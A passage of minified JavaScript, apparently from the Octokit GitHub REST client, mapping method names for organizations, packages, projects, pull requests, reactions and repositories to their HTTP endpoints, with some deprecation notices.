/orgs/{org}/properties/schema/{custom_property_name}"],getMembershipForAuthenticatedUser:["GET /user/memberships/orgs/{org}"],getMembershipForUser:["GET /orgs/{org}/memberships/{username}"],getOrgRole:["GET /orgs/{org}/organization-roles/{role_id}"],getOrgRulesetHistory:["GET /orgs/{org}/rulesets/{ruleset_id}/history"],getOrgRulesetVersion:["GET /orgs/{org}/rulesets/{ruleset_id}/history/{version_id}"],getWebhook:["GET /orgs/{org}/hooks/{hook_id}"],getWebhookConfigForOrg:["GET /orgs/{org}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}"],list:["GET /organizations"],listAppInstallations:["GET /orgs/{org}/installations"],listAttestations:["GET /orgs/{org}/attestations/{subject_digest}"],listBlockedUsers:["GET /orgs/{org}/blocks"],listCustomPropertiesValuesForRepos:["GET /orgs/{org}/properties/values"],listFailedInvitations:["GET /orgs/{org}/failed_invitations"],listForAuthenticatedUser:["GET /user/orgs"],listForUser:["GET /users/{username}/orgs"],listInvitationTeams:["GET /orgs/{org}/invitations/{invitation_id}/teams"],listIssueTypes:["GET /orgs/{org}/issue-types"],listMembers:["GET /orgs/{org}/members"],listMembershipsForAuthenticatedUser:["GET /user/memberships/orgs"],listOrgRoleTeams:["GET /orgs/{org}/organization-roles/{role_id}/teams"],listOrgRoleUsers:["GET /orgs/{org}/organization-roles/{role_id}/users"],listOrgRoles:["GET /orgs/{org}/organization-roles"],listOrganizationFineGrainedPermissions:["GET /orgs/{org}/organization-fine-grained-permissions"],listOutsideCollaborators:["GET /orgs/{org}/outside_collaborators"],listPatGrantRepositories:["GET /orgs/{org}/personal-access-tokens/{pat_id}/repositories"],listPatGrantRequestRepositories:["GET /orgs/{org}/personal-access-token-requests/{pat_request_id}/repositories"],listPatGrantRequests:["GET /orgs/{org}/personal-access-token-requests"],listPatGrants:["GET /orgs/{org}/personal-access-tokens"],listPendingInvitations:["GET /orgs/{org}/invitations"],listPublicMembers:["GET /orgs/{org}/public_members"],listSecurityManagerTeams:["GET /orgs/{org}/security-managers",{},{deprecated:"octokit.rest.orgs.listSecurityManagerTeams() is deprecated, see https://docs.github.com/rest/orgs/security-managers#list-security-manager-teams"}],listWebhookDeliveries:["GET /orgs/{org}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /orgs/{org}/hooks"],pingWebhook:["POST /orgs/{org}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeCustomProperty:["DELETE /orgs/{org}/properties/schema/{custom_property_name}"],removeMember:["DELETE /orgs/{org}/members/{username}"],removeMembershipForUser:["DELETE /orgs/{org}/memberships/{username}"],removeOutsideCollaborator:["DELETE /orgs/{org}/outside_collaborators/{username}"],removePublicMembershipForAuthenticatedUser:["DELETE /orgs/{org}/public_members/{username}"],removeSecurityManagerTeam:["DELETE /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.removeSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#remove-a-security-manager-team"}],reviewPatGrantRequest:["POST /orgs/{org}/personal-access-token-requests/{pat_request_id}"],reviewPatGrantRequestsInBulk:["POST /orgs/{org}/personal-access-token-requests"],revokeAllOrgRolesTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}"],revokeAllOrgRolesUser:["DELETE /orgs/{org}/organization-roles/users/{username}"],revokeOrgRoleTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],revokeOrgRoleUser:["DELETE /orgs/{org}/organization-roles/users/{username}/{role_id}"],setMembershipForUser:["PUT /orgs/{org}/memberships/{username}"],setPublicMembershipForAuthenticatedUser:["PUT /orgs/{org}/public_members/{username}"],unblockUser:["DELETE /orgs/{org}/blocks/{username}"],update:["PATCH /orgs/{org}"],updateIssueType:["PUT /orgs/{org}/issue-types/{issue_type_id}"],updateMembershipForAuthenticatedUser:["PATCH /user/memberships/orgs/{org}"],updatePatAccess:["POST /orgs/{org}/personal-access-tokens/{pat_id}"],updatePatAccesses:["POST /orgs/{org}/personal-access-tokens"],updateWebhook:["PATCH /orgs/{org}/hooks/{hook_id}"],updateWebhookConfigForOrg:["PATCH /orgs/{org}/hooks/{hook_id}/config"]},packages:{deletePackageForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}"],deletePackageForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}"],deletePackageForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}"],deletePackageVersionForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getAllPackageVersionsForAPackageOwnedByAnOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByOrg"]}],getAllPackageVersionsForAPackageOwnedByTheAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByAuthenticatedUser"]}],getAllPackageVersionsForPackageOwnedByAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions"],getPackageForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}"],getPackageForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}"],getPackageForUser:["GET /users/{username}/packages/{package_type}/{package_name}"],getPackageVersionForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],listDockerMigrationConflictingPackagesForAuthenticatedUser:["GET /user/docker/conflicts"],listDockerMigrationConflictingPackagesForOrganization:["GET /orgs/{org}/docker/conflicts"],listDockerMigrationConflictingPackagesForUser:["GET /users/{username}/docker/conflicts"],listPackagesForAuthenticatedUser:["GET /user/packages"],listPackagesForOrganization:["GET /orgs/{org}/packages"],listPackagesForUser:["GET /users/{username}/packages"],restorePackageForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForUser:["POST /users/{username}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageVersionForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForUser:["POST /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"]},privateRegistries:{createOrgPrivateRegistry:["POST /orgs/{org}/private-registries"],deleteOrgPrivateRegistry:["DELETE /orgs/{org}/private-registries/{secret_name}"],getOrgPrivateRegistry:["GET /orgs/{org}/private-registries/{secret_name}"],getOrgPublicKey:["GET /orgs/{org}/private-registries/public-key"],listOrgPrivateRegistries:["GET /orgs/{org}/private-registries"],updateOrgPrivateRegistry:["PATCH /orgs/{org}/private-registries/{secret_name}"]},projects:{addCollaborator:["PUT /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.addCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#add-project-collaborator"}],createCard:["POST /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.createCard() is deprecated, see https://docs.github.com/rest/projects/cards#create-a-project-card"}],createColumn:["POST /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.createColumn() is deprecated, see https://docs.github.com/rest/projects/columns#create-a-project-column"}],createForAuthenticatedUser:["POST /user/projects",{},{deprecated:"octokit.rest.projects.createForAuthenticatedUser() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-user-project"}],createForOrg:["POST /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.createForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#create-an-organization-project"}],createForRepo:["POST /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.createForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-repository-project"}],delete:["DELETE /projects/{project_id}",{},{deprecated:"octokit.rest.projects.delete() is deprecated, see https://docs.github.com/rest/projects/projects#delete-a-project"}],deleteCard:["DELETE /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.deleteCard() is deprecated, see https://docs.github.com/rest/projects/cards#delete-a-project-card"}],deleteColumn:["DELETE /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.deleteColumn() is deprecated, see https://docs.github.com/rest/projects/columns#delete-a-project-column"}],get:["GET /projects/{project_id}",{},{deprecated:"octokit.rest.projects.get() is deprecated, see https://docs.github.com/rest/projects/projects#get-a-project"}],getCard:["GET /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.getCard() is deprecated, see https://docs.github.com/rest/projects/cards#get-a-project-card"}],getColumn:["GET /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.getColumn() is deprecated, see https://docs.github.com/rest/projects/columns#get-a-project-column"}],getPermissionForUser:["GET /projects/{project_id}/collaborators/{username}/permission",{},{deprecated:"octokit.rest.projects.getPermissionForUser() is deprecated, see https://docs.github.com/rest/projects/collaborators#get-project-permission-for-a-user"}],listCards:["GET /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.listCards() is deprecated, see https://docs.github.com/rest/projects/cards#list-project-cards"}],listCollaborators:["GET /projects/{project_id}/collaborators",{},{deprecated:"octokit.rest.projects.listCollaborators() is deprecated, see https://docs.github.com/rest/projects/collaborators#list-project-collaborators"}],listColumns:["GET /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.listColumns() is deprecated, see https://docs.github.com/rest/projects/columns#list-project-columns"}],listForOrg:["GET /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.listForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#list-organization-projects"}],listForRepo:["GET /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.listForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#list-repository-projects"}],listForUser:["GET /users/{username}/projects",{},{deprecated:"octokit.rest.projects.listForUser() is deprecated, see https://docs.github.com/rest/projects/projects#list-user-projects"}],moveCard:["POST /projects/columns/cards/{card_id}/moves",{},{deprecated:"octokit.rest.projects.moveCard() is deprecated, see https://docs.github.com/rest/projects/cards#move-a-project-card"}],moveColumn:["POST /projects/columns/{column_id}/moves",{},{deprecated:"octokit.rest.projects.moveColumn() is deprecated, see https://docs.github.com/rest/projects/columns#move-a-project-column"}],removeCollaborator:["DELETE /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.removeCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#remove-user-as-a-collaborator"}],update:["PATCH /projects/{project_id}",{},{deprecated:"octokit.rest.projects.update() is deprecated, see https://docs.github.com/rest/projects/projects#update-a-project"}],updateCard:["PATCH /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.updateCard() is deprecated, see https://docs.github.com/rest/projects/cards#update-an-existing-project-card"}],updateColumn:["PATCH /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.updateColumn() is deprecated, see https://docs.github.com/rest/projects/columns#update-an-existing-project-column"}]},pulls:{checkIfMerged:["GET /repos/{owner}/{repo}/pulls/{pull_number}/merge"],create:["POST /repos/{owner}/{repo}/pulls"],createReplyForReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments/{comment_id}/replies"],createReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],createReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments"],deletePendingReview:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],deleteReviewComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}"],dismissReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/dismissals"],get:["GET /repos/{owner}/{repo}/pulls/{pull_number}"],getReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],getReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}"],list:["GET /repos/{owner}/{repo}/pulls"],listCommentsForReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/comments"],listCommits:["GET /repos/{owner}/{repo}/pulls/{pull_number}/commits"],listFiles:["GET /repos/{owner}/{repo}/pulls/{pull_number}/files"],listRequestedReviewers:["GET /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],listReviewComments:["GET /repos/{owner}/{repo}/pulls/{pull_number}/comments"],listReviewCommentsForRepo:["GET /repos/{owner}/{repo}/pulls/comments"],listReviews:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],merge:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge"],removeRequestedReviewers:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],requestReviewers:["POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],submitReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/events"],update:["PATCH /repos/{owner}/{repo}/pulls/{pull_number}"],updateBranch:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/update-branch"],updateReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],updateReviewComment:["PATCH /repos/{owner}/{repo}/pulls/comments/{comment_id}"]},rateLimit:{get:["GET /rate_limit"]},reactions:{createForCommitComment:["POST /repos/{owner}/{repo}/comments/{comment_id}/reactions"],createForIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/reactions"],createForIssueComment:["POST /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],createForPullRequestReviewComment:["POST /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],createForRelease:["POST /repos/{owner}/{repo}/releases/{release_id}/reactions"],createForTeamDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],createForTeamDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"],deleteForCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}/reactions/{reaction_id}"],deleteForIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/reactions/{reaction_id}"],deleteForIssueComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions/{reaction_id}"],deleteForPullRequestComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions/{reaction_id}"],deleteForRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}/reactions/{reaction_id}"],deleteForTeamDiscussion:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions/{reaction_id}"],deleteForTeamDiscussionComment:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions/{reaction_id}"],listForCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}/reactions"],listForIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/reactions"],listForIssueComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],listForPullRequestReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],listForRelease:["GET /repos/{owner}/{repo}/releases/{release_id}/reactions"],listForTeamDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],listForTeamDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"]},repos:{acceptInvitation:["PATCH /user/repository_invitations/{invitation_id}",{},{renamed:["repos","acceptInvitationForAuthenticatedUser"]}],acceptInvitationForAuthenticatedUser:["PATCH /user/repository_invitations/{invitation_id}"],addAppAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],addCollaborator:["PUT /repos/{owner}/{repo}/collaborators/{username}"],addStatusCheckContexts:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],addTeamAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],addUserAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],cancelPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}/cancel"],checkAutomatedSecurityFixes:["GET /repos/{owner}/{repo}/automated-security-fixes"],checkCollaborator:["GET /repos/{owner}/{repo}/collaborators/{username}"],checkPrivateVulnerabilityReporting:["GET /repos/{owner}/{repo}/private-vulnerability-reporting"],checkVulnerabilityAlerts:["GET /repos/{owner}/{repo}/vulnerability-alerts"],codeownersErrors:["GET /repos/{owner}/{repo}/codeowners/errors"],compareCommits:["GET /repos/{owner}/{repo}/compare/{base}...{head}"],compareCommitsWithBasehead:["GET /repos/{owner}/{repo}/compare/{basehead}"],createAttestation:["POST /repos/{owner}/{repo}/attestations"],createAutolink:["POST /repos/{owner}/{repo}/autolinks"],createCommitComment:["POST /repos/{owner}/{repo}/commits/{commit_sha}/comments"],createCommitSignatureProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],createCommitStatus:["POST /repos/{owner}/{repo}/statuses/{sha}"],createDeployKey:["POST /repos/{owner}/{repo}/keys"],createDeployment:["POST /repos/{owner}/{repo}/deployments"],createDeploymentBranchPolicy:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],createDeploymentProtectionRule:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],createDeploymentStatus:["POST /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],createDispatchEvent:["POST /repos/{owner}/{repo}/dispatches"],createForAuthenticatedUser:["POST /user/repos"],createFork:["POST /repos/{owner}/{repo}/forks"],createInOrg:["POST /orgs/{org}/repos"],createOrUpdateCustomPropertiesValues:["PATCH /repos/{owner}/{repo}/properties/values"],createOrUpdateEnvironment:["PUT /repos/{owner}/{repo}/environments/{environment_name}"],createOrUpdateFileContents:["PUT /repos/{owner}/{repo}/contents/{path}"],createOrgRuleset:["POST /orgs/{org}/rulesets"],createPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments"],createPagesSite:["POST /repos/{owner}/{repo}/pages"],createRelease:["POST /repos/{owner}/{repo}/releases"],createRepoRuleset:["POST /repos/{owner}/{repo}/rulesets"],createUsingTemplate:["POST /repos/{template_owner}/{template_repo}/generate"],createWebhook:["POST /repos/{owner}/{repo}/hooks"],declineInvitation:["DELETE /user/repository_invitations/{invitation_id}",{},{renamed:["repos","declineInvitationForAuthenticatedUser"]}],declineInvitationForAuthenticatedUser:["DELETE /user/repository_invitations/{invitation_id}"],delete:["DELETE /repos/{owner}/{repo}"],deleteAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],deleteAdminBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],deleteAnEnvironment:["DELETE /repos/{owner}/{repo}/environments/{environment_name}"],deleteAutolink:["DELETE /repos/{owner}/{repo}/autolinks/{autolink_id}"],deleteBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection"],deleteCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}"],deleteCommitSignatureProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],deleteDeployKey:["DELETE /repos/{owner}/{repo}/keys/{key_id}"],deleteDeployment:["DELETE /repos/{owner}/{repo}/deployments/{deployment_id}"],deleteDeploymentBranchPolicy:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],deleteFile:["DELETE /repos/{owner}/{repo}/contents/{path}"],deleteInvitation:["DELETE /repos/{owner}/{repo}/invitations/{invitation_id}"],deleteOrgRuleset:["DELETE /orgs/{org}/rulesets/{ruleset_id}"],deletePagesSite:["DELETE /repos/{owner}/{repo}/pages"],deletePullRequestReviewProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],deleteRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}"],deleteReleaseAsset:["DELETE /repos/{owner}/{repo}/releases/assets/{asset_id}"],deleteRepoRuleset:["DELETE /repos/{owner}/{repo}/rulesets/{ruleset_id}"],deleteWebhook:["DELETE /repos/{owner}/{repo}/hooks/{hook_id}"],disableAutomatedSecurityFixes:["DELETE /repos/{owner}/{repo}/automated-security-fixes"],disableDeploymentProtectionRule:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],disablePrivateVulnerabilityReporting:["DELETE /repos/{owner}/{repo}/private-vulnerability-reporting"],disableVulnerabilityAlerts:["DELETE /repos/{owner}/{repo}/vulnerability-alerts"],downloadArchive:["GET /repos/{owner}/{repo}/zipball/{ref}",{},{renamed:["repos","downloadZipballArchive"]}],downloadTarballArchive:["GET /repos/{owner}/{repo}/tarball/{ref}"],downloadZipballArchive:["GET /repos/{owner}/{repo}/zipball/{ref}"],enableAutomatedSecurityFixes:["PUT /repos/{owner}/{repo}/automated-security-fixes"],enablePrivateVulnerabilityReporting:["PUT /repos/{owner}/{repo}/private-vulnerability-reporting"],enableVulnerabilityAlerts:["PUT /repos/{owner}/{repo}/vulnerability-alerts"],generateReleaseNotes:["POST /repos/{owner}/{repo}/releases/generate-notes"],get:["GET /repos/{owner}/{repo}"],getAccessRestrictions:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],getAdminBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],getAllDeploymentProtectionRules:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],getAllEnvironments:["GET /repos/{owner}/{repo}/environments"],getAllStatusCheckContexts:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts"],getAllTopics:["GET /repos/{owner}/{repo}/topics"],getAppsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps"],getAutolink:["GET /repos/{owner}/{repo}/autolinks/{autolink_id}"],getBranch:["GET /repos/{owner}/{repo}/branches/{branch}"],getBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection"],getBranchRules:["GET /repos/{owner}/{repo}/rules/branches/{branch}"],getClones:["GET /repos/{owner}/{repo}/traffic/clones"],getCodeFrequencyStats:["GET /repos/{owner}/{repo}/stats/code_frequency"],getCollaboratorPermissionLevel:["GET /repos/{owner}/{repo}/collaborators/{username}/permission"],getCombinedStatusForRef:["GET /repos/{owner}/{repo}/commits/{ref}/status"],getCommit:["GET /repos/{owner}/{repo}/commits/{ref}"],getCommitActivityStats:["GET /repos/{owner}/{repo}/stats/commit_activity"],getCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}"],getCommitSignatureProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],getCommunityProfileMetrics:["GET /repos/{owner}/{repo}/community/profile"],getContent:["GET /repos/{owner}/{repo}/contents/{path}"],getContributorsStats:["GET /repos/{owner}/{repo}/stats/contributors"],getCustomDeploymentProtectionRule:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],getCustomPropertiesValues:["GET /repos/{owner}/{repo}/properties/values"],getDeployKey:["GET /repos/{owner}/{repo}/keys/{key_id}"],getDeployment:["GET /repos/{owner}/{repo}/deployments/{deployment_id}"],getDeploymentBranchPolicy:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],getDeploymentStatus:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses/{status_id}"],getEnvironment:["GET /repos/{owner}/{repo}/environments/{environment_name}"],getLatestPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/latest"],getLatestRelease:["GET /repos/{owner}/{repo}/releases/latest"],getOrgRuleSuite:["GET /orgs/{org}/rulesets/rule-suites/{rule_suite_id}"],getOrgRuleSuites:["GET /orgs/{org}/rulesets/rule-suites"],getOrgRuleset:["GET /orgs/{org}/rulesets/{ruleset_id}"],getOrgRulesets:["GET /orgs/{org}/rulesets"],getPages:["GET /repos/{owner}/{repo}/pages"],getPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/{build_id}"],getPagesDeployment:["GET /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}"],getPagesHealthCheck:["GET /repos/{owner}/{repo}/pages/health"],getParticipationStats:["GET /repos/{owner}/{repo}/stats/participation"],getPullRequestReviewProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],getPunchCardStats:["GET /repos/{owner}/{repo}/stats/punch_card"],getReadme:["GET /repos/{owner}/{repo}/readme"],getReadmeInDirectory:["GET /repos/{owner}/{repo}/readme/{dir}"],getRelease:["GET /repos/{owner}/{repo}/releases/{release_id}"],getReleaseAsset:["GET /repos/{owner}/{repo}/releases/assets/{asset_id}"],getReleaseByTag:["GET /repos/{owner}/{repo}/releases/tags/{tag}"],getRepoRuleSuite:["GET /repos/{owner}/{repo}/rulesets/rule-suites/{rule_suite_id}"],getRepoRuleSuites:["GET /repos/{owner}/{repo}/rulesets/rule-suites"],getRepoRuleset:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}"],getRepoRulesetHistory:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history"],getRepoRulesetVersion:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history/{version_id}"],getRepoRulesets:["GET /repos/{owner}/{repo}/rulesets"],getStatusChecksProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],getTeamsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams"],getTopPaths:["GET /repos/{owner}/{repo}/traffic/popular/paths"],getTopReferrers:["GET /repos/{owner}/{repo}/traffic/popular/referrers"],getUsersWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users"],getViews:["GET /repos/{owner}/{repo}/traffic/views"],getWebhook:["GET /repos/{owner}/{repo}/hooks/{hook_id}"],getWebhookConfigForRepo:["GET /repos/{owner}/{repo}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}"],listActivities:["GET /repos/{owner}/{repo}/activity"],listAttestations:["GET /repos/{owner}/{repo}/attestations/{subject_digest}"],listAutolinks:["GET /repos/{owner}/{repo}/autolinks"],listBranches:["GET /repos/{owner}/{repo}/branches"],listBranchesForHeadCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/branches-where-head"],listCollaborators:["GET /repos/{owner}/{repo}/collaborators"],listCommentsForCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/comments"],listCommitCommentsForRepo:["GET /repos/{owner}/{repo}/comments"],listCommitStatusesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/statuses"],listCommits:["GET /repos/{owner}/{repo}/commits"],listContributors:["GET /repos/{owner}/{repo}/contributors"],listCustomDeploymentRuleIntegrations:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/apps"],listDeployKeys:["GET /repos/{owner}/{repo}/keys"],listDeploymentBranchPolicies:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],listDeploymentStatuses:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],listDeployments:["GET /repos/{owner}/{repo}/deployments"],listForAuthenticatedUser:["GET /user/repos"],listForOrg:["GET /orgs/{org}/repos"],listForUser:["GET /users/{username}/repos"],listForks:["GET /repos/{owner}/{repo}/forks"],listInvitations:["GET /repos/{owner}/{repo}/invitations"],listInvitationsForAuthenticatedUser:["GET /user/repository_invitations"],listLanguages:["GET /repos/{owner}/{repo}/languages"],listPagesBuilds:["GET /repos/{owner}/{repo}/pages/builds"],listPublic:["GET /repositories"],listPullRequestsAssociatedWithCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/pulls"],listReleaseAssets:["GET /repos/{owner}/{repo}/releases/{release_id}/assets"],listReleases:["GET /repos/{owner}/{repo}/releases"],listTags:["GET /repos/{owner}/{repo}/tags"],listTeams:["GET /repos/{owner}/{repo}/teams"],listWebhookDeliveries:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /repos/{owner}/{repo}/hooks"],merge:["POST /repos/{owner}/{repo}/merges"],mergeUpstream:["POST /repos/{owner}/{repo}/merge-upstream"],pingWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeAppAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],removeCollaborator:["DELETE /repos/{owner}/{repo}/collaborators/{username}"],removeStatusCheckContexts:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],removeStatusCheckProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],removeTeamAccessRestrictions:["DELETE 